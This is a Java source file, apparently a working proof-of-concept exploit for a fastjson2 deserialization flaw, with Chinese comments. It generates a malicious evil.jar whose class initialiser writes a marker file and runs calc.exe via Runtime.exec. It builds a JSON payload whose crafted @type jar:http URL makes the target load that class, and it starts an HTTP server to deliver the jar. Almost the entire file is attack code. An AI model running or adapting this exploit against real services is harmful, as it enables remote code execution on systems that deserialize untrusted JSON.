package com.example.fastjson2.attacker;

import com.sun.net.httpserver.Headers;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.concurrent.CountDownLatch;
import java.util.jar.Attributes;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;

/**
 * 最小攻击端：
 * 1) 生成 evil.jar
 * 2) 生成 payload.json
 * 3) 启动 HTTP 服务，把 evil.jar 挂到 /x/<unicode> 这条路径上
 */
public final class AttackerApplication implements Opcodes {
    // 当前 PoC 的 @type，已经和 localhost:18181 这条路径绑定好了。
    private static final String TYPE_NAME = "jar:http:..localhost:18181.x.\uBABF\u0A51\u0290\u4CD2!.probe.Marker";
    private static final String EXPECTED_PATH = "/x/" + new String(new int[]{0xBABF, 0x0A51, 0x0290, 0x4CD2}, 0, 4);

    private static final String JAR_ENTRY = "probe/Marker.class";
    private static final String MARKER_FILE = "pwned_remote.txt";
    private static final String MARKER_TEXT = "RCE via FJ2 FNV-hit URL typeName + jar: load\n";

    private static final int PORT = 18181;
    private static final Path EVIL_JAR = Paths.get("run", "www", "evil.jar");
    private static final Path PAYLOAD_JSON = Paths.get("run", "payload.json");

    public static void main(String[] args) throws Exception {
        // 先把两份核心产物落盘，方便你在 IDEA 里直接看和直接发。
        writeEvilJar(EVIL_JAR);
        writeUtf8(PAYLOAD_JSON, payloadJson());

        System.out.println("TYPE_NAME=" + TYPE_NAME);
        System.out.println("PAYLOAD=" + PAYLOAD_JSON.toAbsolutePath());
        System.out.println("EVIL_JAR=" + EVIL_JAR.toAbsolutePath());
        System.out.println("EXPECTED=" + unicodeEscape(EXPECTED_PATH));
        System.out.println("EXPECTED_HEX=" + utf8Hex(EXPECTED_PATH));
        System.out.println("LISTEN=0.0.0.0:" + PORT);
        System.out.println("NOTE=当前 PoC 固定使用 localhost:18181，别改端口");

        HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", PORT), 0);
        server.createContext("/", new RootHandler());
        server.start();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> server.stop(0)));
        new CountDownLatch(1).await();
    }

    /** 把远程类打进 evil.jar。 */
    private static void writeEvilJar(Path jarPath) throws IOException {
        Files.createDirectories(jarPath.toAbsolutePath().getParent());

        Manifest manifest = new Manifest();
        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, "1.0");

        try (JarOutputStream jarOut = new JarOutputStream(Files.newOutputStream(jarPath), manifest)) {
            jarOut.putNextEntry(new JarEntry(JAR_ENTRY));
            jarOut.write(buildMarkerClass());
            jarOut.closeEntry();
        }
    }

    /**
     * 用 ASM 现场生成 Marker.class。
     *
     * 这个类最关键的是静态初始化方法 <clinit>：
     * - 只要类被目标 JVM define/load，<clinit> 就会自动执行一次
     * - 这里我们让它做两件事：
     *   1) 往本地文件 pwned_remote.txt 写一行文本
     *   2) 往标准输出打印一行日志
     *
     * 你前面问“如果想做俩次输出怎么办”，关键点是：
     * - 不能只多写一次 visitLdcInsn(...)
     * - 因为 visitLdcInsn 只是“把一个常量压栈”，它本身不会真正输出
     * - 真正的输出，必须是“一整套完整调用链”
     *   例如 println 需要：GETSTATIC System.out -> LDC 字符串 -> INVOKEVIRTUAL println
     *   例如写文件需要：准备 FileOutputStream -> 准备 byte[] -> INVOKEVIRTUAL write
     *
     * 换句话说：
     * - 想打印两次，就复制两整段 println 调用序列
     * - 想写文件两次，就复制两整段 write 调用序列
     * - 只额外塞一个 visitLdcInsn，会让栈里多出一个“没人消费的常量”，
     *   生成出来的字节码就和预期不一致，轻则行为错，重则校验/执行阶段异常
     */
    private static byte[] buildMarkerClass() {
        // ASM / JVM 内部类名用斜杠，不用点。
        // 这里 TYPE_NAME 是 jar:http:..localhost:18181.x.<unicode>!.probe.Marker
        // replace 后会变成 jar:http://localhost:18181/x/<unicode>!/probe/Marker
        // 这正是原始 PoC 要利用的内部名形式。
        String internalName = TYPE_NAME.replace('.', '/');

        ClassWriter cw = new ClassWriter(0);
        cw.visit(V1_8, ACC_PUBLIC | ACC_SUPER, internalName, null, "java/lang/Object", null);
        cw.visitField(ACC_PUBLIC, "x", "I", null, null).visitEnd();

        // 生成：static { ... }
        MethodVisitor mv = cw.visitMethod(ACC_STATIC, "<clinit>", "()V", null, null);
        mv.visitCode();

        // ===== 第 1 段：new FileOutputStream("pwned_remote.txt") =====
        // NEW 只分配对象，还没调构造。
        mv.visitTypeInsn(NEW, "java/io/FileOutputStream");
        // DUP 复制一份引用，因为后面 <init> 会消耗一个引用；
        // 没有 DUP，就没法既调用构造，又保留对象给后续 write(...) 使用。
        mv.visitInsn(DUP);
        // 压入构造参数：文件名字符串。
        mv.visitLdcInsn(MARKER_FILE);
        // 调用构造：FileOutputStream(String)
        mv.visitMethodInsn(INVOKESPECIAL, "java/io/FileOutputStream", "<init>", "(Ljava/lang/String;)V", false);

        // 现在栈顶保留着已经初始化好的 FileOutputStream 实例。
        // 接下来给它准备 write(byte[]) 所需的参数 byte[]。

        // 压入要写入文件的文本内容。
        mv.visitLdcInsn(MARKER_TEXT);
        // 调用 String.getBytes()，把 String 变成 byte[]。
        // 调完后，栈上顺序大致是：[FileOutputStream, byte[]]
        mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "getBytes", "()[B", false);
        // 调用 FileOutputStream.write(byte[])
        // 这一步才是真正的“第一次输出”（输出到文件）。
        mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/FileOutputStream", "write", "([B)V", false);

        // ===== 第 2 段：System.out.println("...") =====
        // 取出 System.out(PrintStream)
        mv.visitFieldInsn(GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
        // 压入 println 的参数字符串。
        mv.visitLdcInsn("[PWN-FJ2-URL] Marker.<clinit> executed");
        // 调用 println(String)
        // 这一步才是真正的“第二次输出”（输出到控制台）。
        mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);

        // 如果你想“控制台输出两次”，正确做法是再补一整组：
        //   GETSTATIC System.out
        //   LDC "第二行"
        //   INVOKEVIRTUAL println
        // 而不是只多写一个 visitLdcInsn("第二行")。
        //
        // 例如：
        // mv.visitFieldInsn(GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
        // mv.visitLdcInsn("[PWN-FJ2-URL] second line");
        // mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
        //
        // 同理，如果你想“文件写两次”，也要再补完整 write 链路，不能只额外压一次字符串常量。

        mv.visitMethodInsn(
                Opcodes.INVOKESTATIC,
                "java/lang/Runtime",
                "getRuntime",
                "()Ljava/lang/Runtime;",
                false);

        mv.visitLdcInsn("calc.exe");

        mv.visitMethodInsn(
                Opcodes.INVOKEVIRTUAL,
                "java/lang/Runtime",
                "exec",
                "(Ljava/lang/String;)Ljava/lang/Process;",
                false);



        mv.visitInsn(RETURN);
        // 这里直接手填 max stack / max locals。
        // 当前方法局部变量表为空(locals=0)；栈深最高 4 足够覆盖上面的对象构造和参数压栈。
        mv.visitMaxs(4, 0);
        mv.visitEnd();

        // 生成默认构造：public Marker() { super(); }
        mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
        mv.visitCode();
        mv.visitVarInsn(ALOAD, 0);
        mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        mv.visitInsn(RETURN);
        mv.visitMaxs(1, 1);
        mv.visitEnd();

        cw.visitEnd();
        return cw.toByteArray();
    }

    private static String payloadJson() {
        return "{\"@type\": \"" + TYPE_NAME + "\", \"x\": 1}";
    }

    private static void writeUtf8(Path path, String content) throws IOException {
        Files.createDirectories(path.toAbsolutePath().getParent());
        Files.write(path, content.getBytes(StandardCharsets.UTF_8));
    }

    private static String utf8Hex(String value) {
        byte[] bytes = value.getBytes(StandardCharsets.UTF_8);
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) {
            sb.append(String.format("%02x", b & 0xff));
        }
        return sb.toString();
    }

    private static String unicodeEscape(String value) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < value.length(); ) {
            int cp = value.codePointAt(i);
            if (cp >= 0x20 && cp <= 0x7e && cp != '\\') {
                sb.append((char) cp);
            } else {
                sb.append(String.format("\\u%04X", cp));
            }
            i += Character.charCount(cp);
        }
        return sb.toString();
    }

    /** 最小 HTTP 逻辑：/health 回 ok，其余命中 /x/* 就回 evil.jar。 */
    private static final class RootHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String raw = exchange.getRequestURI().getRawPath();
            String path = URLDecoder.decode(raw, StandardCharsets.UTF_8.name());

            log("GET raw=%s unquote=%s hex=%s",
                    unicodeEscape(raw),
                    unicodeEscape(path),
                    utf8Hex(path));

            if ("/".equals(path) || "/health".equals(path) || "/health.txt".equals(path)) {
                writeResponse(exchange, 200, "text/plain; charset=utf-8", "ok\n".getBytes(StandardCharsets.UTF_8));
                return;
            }

            boolean ok = (EXPECTED_PATH.equals(path) || path.startsWith("/x/")) && Files.isRegularFile(EVIL_JAR);
            log("expected_hex=%s match=%s", utf8Hex(EXPECTED_PATH), ok);

            if (ok) {
                byte[] data = Files.readAllBytes(EVIL_JAR);
                writeResponse(exchange, 200, "application/java-archive", data);
                log("served evil.jar %d bytes", data.length);
                return;
            }

            byte[] body = ("404 expected=" + unicodeEscape(EXPECTED_PATH)
                    + " got=" + unicodeEscape(path) + "\n").getBytes(StandardCharsets.UTF_8);
            writeResponse(exchange, 404, "text/plain; charset=utf-8", body);
        }
    }

    private static void writeResponse(HttpExchange exchange, int status, String contentType, byte[] data) throws IOException {
        Headers headers = exchange.getResponseHeaders();
        headers.set("Content-Type", contentType);
        headers.set("Content-Length", String.valueOf(data.length));
        exchange.sendResponseHeaders(status, data.length);
        try (OutputStream out = exchange.getResponseBody()) {
            out.write(data);
        }
    }

    private static void log(String fmt, Object... args) {
        System.err.println("[attacker] " + String.format(fmt, args));
    }
}
